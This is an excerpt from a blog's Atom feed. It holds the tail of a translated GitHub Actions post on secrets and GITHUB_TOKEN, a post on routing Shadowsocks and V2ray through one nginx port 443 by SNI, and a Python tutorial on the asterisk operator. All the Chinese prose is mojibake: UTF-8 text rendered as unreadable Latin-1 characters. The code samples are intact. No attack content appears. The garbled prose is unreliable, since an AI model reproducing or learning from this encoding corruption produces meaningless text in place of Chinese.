alt="image"></p><p>è¦ä½¿ç”¨è¯¥å¯†ç ï¼Œä½ å¯ä»¥åœ¨å·¥ä½œæµä¸­ä½¿ç”¨ä¸Šä¸‹æ–‡ <code>secrets</code> æ¥å¼•ç”¨å®ƒã€‚å¦‚æœä½ æœ‰ä¸€ä¸ªå¯†ç çš„åå­— <code>SECRET_KEY</code>ï¼Œä½ å¯ä»¥å°†å…¶ç§°ä¸º <code>$&#123;&#123;secret.SECRET_KEY&#125;&#125;</code>ã€‚</p><script src="https://gist.github.com/ethomson/eb722482cfd7f955f17c3231efe8804a.js"></script><h2><span id="github-token"><code>GITHUB_TOKEN</code></span></h2><p>GitHub Actionsä¼šä¸ºæ¯æ¬¡è¿è¡Œçš„å·¥ä½œæµè‡ªåŠ¨åœ¨å­˜å‚¨åº“ä¸­è®¾ç½®ä¸€ä¸ªå¯†ç  <code>GITHUB_TOKEN</code>ã€‚è¯¥ä»¤ç‰Œä½¿ä½ å¯ä»¥ä¸å­˜å‚¨åº“è¿›è¡Œäº¤äº’ï¼Œè€Œæ— éœ€è‡ªå·±åˆ›å»ºæ–°ä»¤ç‰Œæˆ–è®¾ç½®å¯†ç ã€‚</p><p>è¯¥ä»¤ç‰Œä¸ºä½ æä¾›äº†å¯¹å­˜å‚¨åº“æœ¬èº«ï¼Œissueå’Œ<a href="https://www.edwardthomson.com/blog/github_actions_9_deploy_to_github_packages.html">GitHub Packages</a>è¿›è¡Œè¯»å†™çš„æœ‰é™è®¿é—®æƒé™ã€‚ä½†æ˜¯å®ƒä¸èƒ½å®Œå…¨è®¿é—®æ‰€æœ‰å†…å®¹â”€â”€ä½ æ— æ³•ä¸ç»„ç»‡ä¸­çš„å…¶ä»–å­˜å‚¨åº“ä¸€èµ·ä½¿ç”¨ï¼Œä¹Ÿæ— æ³•å‘å¸ƒåˆ°GitHub Pagesâ”€â”€å› æ­¤ï¼Œå¯¹äºæŸäº›å·¥ä½œæµï¼Œä½ å¯èƒ½ä»éœ€è¦è®¾ç½®ä»¤ç‰Œã€‚</p><h2><span id="mi-ma-an-quan">å¯†ç å®‰å…¨</span></h2><p>GitHubè¯•å›¾é˜²æ­¢ä½ çš„å¯†ç è¢«çª¥è§†ã€‚åœ¨è¾“å‡ºæ—¥å¿—ä¸­ï¼Œä½ å®šä¹‰çš„æ‰€æœ‰å¯†ç éƒ½ä¼šè¢«æ¸…é™¤ï¼Œå¹¶åœ¨è¾“å‡ºæ—¥å¿—ä¹‹å‰ç”¨æ˜Ÿå·æ›¿æ¢ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/77734893-7ddddb00-7044-11ea-93af-18ab47df2ffd.png" alt="image"></p><p>è¿™æœ‰åŠ©äºä¿æŠ¤ä½ çš„å¯†ç ï¼Œé˜²æ­¢ä»–äººçª¥è§†ï¼Œå°¤å…¶æ˜¯åˆ©ç”¨é‚£äº›å¯¼å‡ºå€¼çš„å·¥å…·ã€‚ä½†è¿™å½“ç„¶ä¸æ˜¯å®Œç¾çš„ï¼Œä½ åº”è¯¥è°¨æ…ä¿æŠ¤å¯†ç ã€‚</p><h2><span id="forks">Forks</span></h2><p>å¦‚æœä½ çš„é¡¹ç›®ä½¿ç”¨forkæ¥æ¥å—æ¥è‡ªè´¡çŒ®è€…çš„pull requestï¼ˆä¾‹å¦‚ï¼Œå¦‚æœä½ æ­£åœ¨å¼€å‘ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼‰ï¼Œåˆ™å¯èƒ½å¯¹åœ¨å·¥ä½œæµç¨‹ä¸­ä½¿ç”¨å¯†ç æœ‰æ‰€è­¦æƒ•ã€‚</p><p>GitHubæ˜ç¡® <strong>ç¦ç”¨</strong> äº†å¯¹æ¥è‡ªforkçš„å·¥ä½œæµæä¾›å¯†ç çš„åŠŸèƒ½ã€‚è¿™æ„å‘³ç€ï¼Œå½“ç”¨æˆ·ä»forkæ‰“å¼€å¯¹ä½ çš„é¡¹ç›®çš„pull requestæ—¶ï¼Œä¸ä¼šå‘æ­¤å·¥ä½œæµæä¾›ä»»ä½•å¯†ç ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/77734903-86361600-7044-11ea-8475-410b7380eb83.png" alt="image"></p><p>è¿™æœ‰åŠ©äºé˜²æ­¢ç”¨æˆ·ä¿®æ”¹å·¥ä½œæµç¨‹æœ¬èº«â”€â”€æˆ–å·¥ä½œæµç¨‹è°ƒç”¨çš„ä»»ä½•è„šæœ¬â”€â”€è¯•å›¾è·å–ä½ çš„å¯†ç å‰¯æœ¬ã€‚è¿™äº›å¯†ç æ ¹æœ¬æ— æ³•è·å¾—ã€‚</p><p>ï¼ˆ<code>GITHUB_TOKEN</code>ä»ç„¶ä¸ºforkæä¾›äº†ç‰¹æ®ŠåŠŸèƒ½ï¼Œä»¥ä¾¿å®ƒä»¬å¯ä»¥å…‹éš†ä½ çš„å­˜å‚¨åº“ï¼ˆä»¥ä¾¿æ„å»ºå®ƒï¼‰ï¼Œä½†å·²å°†å…¶é™çº§ä¸ºåªè¯»ä»¤ç‰Œï¼Œä»¥é˜²æ­¢forkå·¥ä½œæµåœ¨ä½ çš„å­˜å‚¨åº“ä¸­è¿›è¡Œæ›´æ”¹ã€‚ï¼‰</p><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://www.edwardthomson.com/blog/github_actions_11_secrets.html">https://www.edwardthomson.com/blog/github_actions_11_secrets.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3><hr><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/94#issuecomment-828274529"><strong>Volcano-Yang</strong></a> on: <strong>4/28/2021</strong></p></blockquote><h2><span id="sha-fa-gan-xie-lou-zhu-de-fan-yi">æ²™å‘ğŸ›‹  æ„Ÿè°¢æ¥¼ä¸»çš„ç¿»è¯‘</span></h2><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/94#issuecomment-828275735"><strong>Volcano-Yang</strong></a> on: <strong>4/28/2021</strong></p></blockquote><p><img src="https://user-images.githubusercontent.com/43328103/116375203-a173e600-a841-11eb-8535-4212b723be16.png" alt="image">ç°åœ¨è¿˜æ”¯æŒè®¾ç½®ç¯å¢ƒsecrets é™åˆ¶ä¸åŒåˆ†æ”¯å¯¹secretçš„è¯»å–æƒé™</p>]]></content>
    
    <summary type="html">
    
      GitHub Actions ç¬¬11å¤©ï¼šå¯†ç ï¼ˆSecretsï¼‰
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>Shadowsocks å’Œ V2ray å…±ç”¨443ç«¯å£</title>
    <link href="https://qiwihui.com/qiwihui-blog-104/"/>
    <id>https://qiwihui.com/qiwihui-blog-104/</id>
    <published>2022-08-13T01:54:25.420Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="pei-zhi-guo-cheng">é…ç½®è¿‡ç¨‹</span></h2><p>ä¹‹å‰éƒ¨ç½²äº† Shadowsocks å’Œ V2ray åœ¨ä¸¤å°æœåŠ¡å™¨ä¸Šï¼Œæœ€è¿‘ç”±äºè´¹ç”¨å¢åŠ ï¼Œäºæ˜¯å†³å®šå°†ä¸¤ä¸ªæœåŠ¡åˆå¹¶åˆ°åŒä¸€å°æœåŠ¡å™¨ä¸Šï¼Œå¹¶ä¿æŒåŸæ¥çš„é…ç½®æ–‡ä»¶ä¸å˜ã€‚æ­¤æ–‡ç®€å•è®°å½•ã€‚</p><p>Shadowsocks é…ç½®äº† simple-obfs æµ‘ä¸‹ï¼Œå‚æ•°ä¸º <code>obfs=tls</code>ã€‚V2ray ä½¿ç”¨ nginx + tls + websocketï¼Œå¹¶ä½¿ç”¨letsencryptè‡ªåŠ¨ç”Ÿæˆ HTTPS è¯ä¹¦ã€‚ä¸¤ä¸ªå‡ä½¿ç”¨ä¸åŒçš„åŸŸåè®¿é—®ã€‚</p><p>ä¸»è¦çš„éš¾ç‚¹åœ¨äºéœ€è¦æ ¹æ®ä¸åŒçš„åŸŸåå°†æµé‡åˆ†å‘åˆ°åç«¯ä¸åŒçš„ä»£ç†ä¸Šï¼Œæ–¹æ³•ä½¿ç”¨ Nginx åŸºäº SNI çš„ 4 å±‚è½¬å‘ï¼Œå³è¯†åˆ« SNI ä¿¡æ¯ï¼Œç„¶åç›´æ¥è½¬å‘ TCP/UDP æ•°æ®æµã€‚ä½¿ç”¨çš„æ¨¡å—æ˜¯ <code>ngx_stream_ssl_preread_module</code>ï¼Œè¿™ä¸ªæ¨¡å—åœ¨ Nginx 1.11.5 ä¹‹åæ‰å¼•å…¥ï¼Œæ³¨æ„å¼€å¯ã€‚</p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                                     ----&gt; shadowsocks</span><br><span class="line">                                     |</span><br><span class="line">å®¢æˆ·ç«¯ --[è¯·æ±‚]--&gt; Nginx ----[åˆ†å‘]----&gt;</span><br><span class="line">                                     |</span><br><span class="line">                                     ----&gt; v2ray</span><br></pre></td></tr></table></figure><p>ä¸ºäº†æ–¹ä¾¿éƒ¨ç½²ï¼Œä½¿ç”¨ docker-compose å®Œæˆæ•´ä¸ªéƒ¨ç½²è¿‡ç¨‹ï¼Œé¡¹ç›®åœ°å€ <a href="https://github.com/qiwihui/ssv2ray">qiwihui/ssv2ray</a>ã€‚</p><p>Nginx å…³é”®é…ç½®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">stream &#123;</span><br><span class="line">    # SNI, domain to config</span><br><span class="line">    map $ssl_preread_server_name $backend_name &#123;</span><br><span class="line">        domain1.com v2fly;</span><br><span class="line">        domain2.com shadowsocks;</span><br><span class="line">        # å› ä¸ºä½¿ç”¨äº†æ··æ·†ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦å¡«å…¥æ··æ·†çš„åŸŸåï¼Œæ¯”å¦‚ www.bing.com</span><br><span class="line">        www.bing.com shadowsocks;</span><br><span class="line">        default v2fly;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # v2ray</span><br><span class="line">    upstream v2fly &#123;</span><br><span class="line">        server nginx-proxy:443;</span><br><span class="line">    &#125;</span><br><span class="line">    upstream v2fly80 &#123;</span><br><span class="line">        server nginx-proxy:80;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # shadowsocks</span><br><span class="line">    upstream shadowsocks &#123;</span><br><span class="line">        server shadowsocks:443;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # 80ï¼Œè¿™ä¸ªç«¯å£ç”¨äºè‡ªåŠ¨ç”Ÿæˆè¯ä¹¦</span><br><span class="line">    server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        listen [::]:80;</span><br><span class="line">        proxy_pass v2fly80;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen 443 reuseport;</span><br><span class="line">        listen [::]:443 reuseport;</span><br><span class="line">        proxy_pass  $backend_name;</span><br><span class="line">        ssl_preread on;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="can-kao">å‚è€ƒ</span></h2><ol><li><a href="https://www.chengxiaobai.cn/record/trojan-shared-443-port-scheme.html">Trojan å…±ç”¨ 443 ç«¯å£æ–¹æ¡ˆ</a></li></ol><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Shadowsocks å’Œ V2ray å…±ç”¨443ç«¯å£
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="GFW" scheme="https://qiwihui.com/tags/GFW/"/>
    
  </entry>
  
  <entry>
    <title>19. æ˜Ÿå·æ“ä½œç¬¦ â€” Python è¿›é˜¶</title>
    <link href="https://qiwihui.com/qiwihui-blog-130/"/>
    <id>https://qiwihui.com/qiwihui-blog-130/</id>
    <published>2022-08-13T01:54:25.420Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>æ˜Ÿå·ï¼ˆ <code>*</code> ï¼‰å¯ç”¨äºPythonä¸­çš„ä¸åŒæƒ…å†µï¼š</p><ul><li>ä¹˜æ³•å’Œå¹‚è¿ç®—</li><li>åˆ›å»ºå…·æœ‰é‡å¤å…ƒç´ çš„åˆ—è¡¨ï¼Œå…ƒç»„æˆ–å­—ç¬¦ä¸²</li><li><code>*args</code>ï¼Œ <code>**kwargs</code> å’Œä»…å…³é”®å­—å‚æ•°</li><li>æ‹†åŒ…åˆ—è¡¨/å…ƒç»„/å­—å…¸çš„å‡½æ•°å‚æ•°</li><li>æ‹†åŒ…å®¹å™¨</li><li>å°†å¯è¿­ä»£å¯¹è±¡åˆå¹¶åˆ°åˆ—è¡¨ä¸­/åˆå¹¶å­—å…¸</li></ul><span id="more"></span><h3><span id="cheng-fa-he-mi-yun-suan">ä¹˜æ³•å’Œå¹‚è¿ç®—</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä¹˜æ³•</span></span><br><span class="line">result = <span class="number">7</span> * <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¹‚è¿ç®—</span></span><br><span class="line">result = <span class="number">2</span> ** <span class="number">4</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">35</span></span><br><span class="line"><span class="number">16</span></span><br></pre></td></tr></table></figure><h3><span id="chuang-jian-ju-you-chong-fu-yuan-su-de-lie-biao-yuan-zu-huo-zi-fu-chuan">åˆ›å»ºå…·æœ‰é‡å¤å…ƒç´ çš„åˆ—è¡¨ï¼Œå…ƒç»„æˆ–å­—ç¬¦ä¸²</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># list</span></span><br><span class="line">zeros = [<span class="number">0</span>] * <span class="number">10</span></span><br><span class="line">onetwos = [<span class="number">1</span>, <span class="number">2</span>] * <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(zeros)</span><br><span class="line"><span class="built_in">print</span>(onetwos)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tuple</span></span><br><span class="line">zeros = (<span class="number">0</span>,) * <span class="number">10</span></span><br><span class="line">onetwos = (<span class="number">1</span>, <span class="number">2</span>) * <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(zeros)</span><br><span class="line"><span class="built_in">print</span>(onetwos)</span><br><span class="line"></span><br><span class="line"><span class="comment"># string</span></span><br><span class="line">A_string = <span class="string">&quot;A&quot;</span> * <span class="number">10</span></span><br><span class="line">AB_string = <span class="string">&quot;AB&quot;</span> * <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(A_string)</span><br><span class="line"><span class="built_in">print</span>(AB_string)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">(<span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">AAAAAAAAAA</span><br><span class="line">ABABABABAB</span><br></pre></td></tr></table></figure><h3><span id="args-kwargs-he-jin-guan-jian-zi-can-shu"><code>*args</code>ï¼Œ <code>**kwargs</code> å’Œä»…å…³é”®å­—å‚æ•°</span></h3><ul><li>å¯¹å¯å˜é•¿åº¦å‚æ•°ä½¿ç”¨ <code>*args</code></li><li>å¯¹é•¿åº¦å¯å˜çš„å…³é”®å­—å‚æ•°ä½¿ç”¨ <code>**kwargs</code></li><li>ä½¿ç”¨ <code>*</code>ï¼Œåè·Ÿæ›´å¤šå‡½æ•°å‚æ•°ä»¥å¼ºåˆ¶ä½¿ç”¨ä»…å…³é”®å­—çš„å‚æ•°</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_function</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="keyword">for</span> arg <span class="keyword">in</span> args:</span><br><span class="line">        <span class="built_in">print</span>(arg)</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> kwargs:</span><br><span class="line">        <span class="built_in">print</span>(key, kwargs[key])</span><br><span class="line">        </span><br><span class="line">my_function(<span class="string">&quot;Hey&quot;</span>, <span class="number">3</span>, [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>], name=<span class="string">&quot;Alex&quot;</span>, age=<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x27;*&#x27; æˆ– &#x27;* identifier&#x27; ä¹‹åçš„å‚æ•°æ˜¯ä»…å…³é”®å­—å‚æ•°ï¼Œåªèƒ½ä½¿ç”¨å…³é”®å­—å‚æ•°ä¼ é€’ã€‚</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_function2</span>(<span class="params">name, *, age</span>):</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line">    <span class="built_in">print</span>(age)</span><br><span class="line"></span><br><span class="line"><span class="comment"># my_function2(&quot;Michael&quot;, 5) --&gt; è¿™ä¼šå¼•å‘ TypeError é”™è¯¯</span></span><br><span class="line">my_function2(<span class="string">&quot;Michael&quot;</span>, age=<span class="number">5</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Hey</span><br><span class="line"><span class="number">3</span></span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">name Alex</span><br><span class="line">age <span class="number">8</span></span><br><span class="line">Michael</span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure><h3><span id="chai-bao-han-shu-can-shu">æ‹†åŒ…å‡½æ•°å‚æ•°</span></h3><ul><li>å¦‚æœé•¿åº¦ä¸å‚æ•°åŒ¹é…ï¼Œåˆ™åˆ—è¡¨/å…ƒç»„/é›†åˆ/å­—ç¬¦ä¸²å¯ä»¥ç”¨ <code>*</code> æ‹†æˆå‡½æ•°å‚æ•°ã€‚</li><li>å¦‚æœé•¿åº¦å’Œé”®ä¸å‚æ•°åŒ¹é…ï¼Œåˆ™å­—å…¸å¯ä»¥ç”¨ä¸¤ä¸ª <code>**</code> æ‹†åŒ…ã€‚</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    <span class="built_in">print</span>(a, b, c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># é•¿åº¦å¿…éœ€åŒ¹é…</span></span><br><span class="line">my_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">foo(*my_list)</span><br><span class="line"></span><br><span class="line">my_string = <span class="string">&quot;ABC&quot;</span></span><br><span class="line">foo(*my_string)</span><br><span class="line"></span><br><span class="line"><span class="comment"># é•¿åº¦å’Œé”®å¿…éœ€åŒ¹é…</span></span><br><span class="line">my_dict = &#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">6</span>&#125;</span><br><span class="line">foo(**my_dict)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line">A B C</span><br><span class="line"><span class="number">4</span> <span class="number">5</span> <span class="number">6</span></span><br></pre></td></tr></table></figure><h3><span id="chai-bao-rong-qi">æ‹†åŒ…å®¹å™¨</span></h3><p>å°†åˆ—è¡¨ï¼Œå…ƒç»„æˆ–é›†åˆçš„å…ƒç´ æ‹†åŒ…ä¸ºå•ä¸ªå’Œå¤šä¸ªå‰©ä½™å…ƒç´ ã€‚ è¯·æ³¨æ„ï¼Œå³ä½¿è¢«æ‹†åŒ…çš„å®¹å™¨æ˜¯å…ƒç»„æˆ–é›†åˆï¼Œä¹Ÿå°†å¤šä¸ªå…ƒç´ ç»„åˆåœ¨ä¸€ä¸ªåˆ—è¡¨ä¸­ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">numbers = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">*beginning, last = numbers</span><br><span class="line"><span class="built_in">print</span>(beginning)</span><br><span class="line"><span class="built_in">print</span>(last)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">first, *end = numbers</span><br><span class="line"><span class="built_in">print</span>(first)</span><br><span class="line"><span class="built_in">print</span>(end)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line">first, *middle, last = numbers</span><br><span class="line"><span class="built_in">print</span>(first)</span><br><span class="line"><span class="built_in">print</span>(middle)</span><br><span class="line"><span class="built_in">print</span>(last)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]</span><br><span class="line"><span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span></span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]</span><br><span class="line"></span><br><span class="line"><span class="number">1</span></span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]</span><br><span class="line"><span class="number">8</span></span><br></pre></td></tr></table></figure><h3><span id="jiang-ke-die-dai-dui-xiang-he-bing-dao-lie-biao-zhong-he-bing-zi-dian">å°†å¯è¿­ä»£å¯¹è±¡åˆå¹¶åˆ°åˆ—è¡¨ä¸­/åˆå¹¶å­—å…¸</span></h3><p>ç”±äºPEP 448ï¼ˆ<a href="https://www.python.org/dev/peps/pep-0448/">https://www.python.org/dev/peps/pep-0448/</a>ï¼‰ï¼Œä»Python 3.5å¼€å§‹ï¼Œè¿™æ˜¯å¯èƒ½çš„ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å°†å¯è¿­ä»£å¯¹è±¡åˆå¹¶åˆ°åˆ—è¡¨ä¸­</span></span><br><span class="line">my_tuple = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">my_set = &#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;</span><br><span class="line">my_list = [*my_tuple, *my_set]</span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”¨å­—å…¸æ‹†åŒ…åˆå¹¶ä¸¤ä¸ªå­—å…¸</span></span><br><span class="line">dict_a = &#123;<span class="string">&#x27;one&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;two&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line">dict_b = &#123;<span class="string">&#x27;three&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;four&#x27;</span>: <span class="number">4</span>&#125;</span><br><span class="line">dict_c = &#123;**dict_a, **dict_b&#125;</span><br><span class="line"><span class="built_in">print</span>(dict_c)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">&#123;<span class="string">&#x27;one&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;two&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;three&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;four&#x27;</span>: <span class="number">4</span>&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ï¼Œè¯·æ³¨æ„ä»¥ä¸‹åˆå¹¶è§£å†³æ–¹æ¡ˆã€‚ å¦‚æœå­—å…¸ä¸­æœ‰ä»»ä½•éå­—ç¬¦ä¸²é”®ï¼Œåˆ™å®ƒå°†ä¸èµ·ä½œç”¨ï¼š<a href="https://stackoverflow.com/questions/38987/how-to-merge-two-dictionaries-in-a-single-expression/39858#39858">https://stackoverflow.com/questions/38987/how-to-merge-two-dictionaries-in-a-single-expression/39858#39858</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict_a = &#123;<span class="string">&#x27;one&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;two&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line">dict_b = &#123;<span class="number">3</span>: <span class="number">3</span>, <span class="string">&#x27;four&#x27;</span>: <span class="number">4</span>&#125;</span><br><span class="line">dict_c = <span class="built_in">dict</span>(dict_a, **dict_b)</span><br><span class="line"><span class="built_in">print</span>(dict_c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»¥ä¸‹å¯è¡Œ:</span></span><br><span class="line"><span class="comment"># dict_c = &#123;**dict_a, **dict_b&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">---------------------------------------------------------------------------</span><br><span class="line">    TypeError                                 Traceback (most recent call last)</span><br><span class="line">    &lt;ipython-<span class="built_in">input</span>-<span class="number">52</span>-2660fb90a60f&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">          <span class="number">1</span> dict_a = &#123;<span class="string">&#x27;one&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;two&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line">          <span class="number">2</span> dict_b = &#123;<span class="number">3</span>: <span class="number">3</span>, <span class="string">&#x27;four&#x27;</span>: <span class="number">4</span>&#125;</span><br><span class="line">    ----&gt; <span class="number">3</span> dict_c = <span class="built_in">dict</span>(dict_a, **dict_b)</span><br><span class="line">          <span class="number">4</span> <span class="built_in">print</span>(dict_c)</span><br><span class="line">          <span class="number">5</span> </span><br><span class="line">    TypeError: keywords must be strings</span><br></pre></td></tr></table></figure><p>æ¨èè¿›ä¸€æ­¥é˜…è¯»ï¼š</p><ul><li><a href="https://treyhunner.com/2018/10/asterisks-in-python-what-they-are-and-how-to-use-them/">https://treyhunner.com/2018/10/asterisks-in-python-what-they-are-and-how-to-use-them/</a></li><li><a href="https://treyhunner.com/2016/02/how-to-merge-dictionaries-in-python/">https://treyhunner.com/2016/02/how-to-merge-dictionaries-in-python/</a></li></ul><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      19. æ˜Ÿå·æ“ä½œç¬¦ â€” Python è¿›é˜¶
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>07. Itertools â€” Python è¿›é˜¶</title>
    <link href="https://qiwihui.com/qiwihui-blog-124/"/>
    <id>https://qiwihui.com/qiwihui-blog-124/</id>
    <published>2022-08-13T01:54:25.320Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
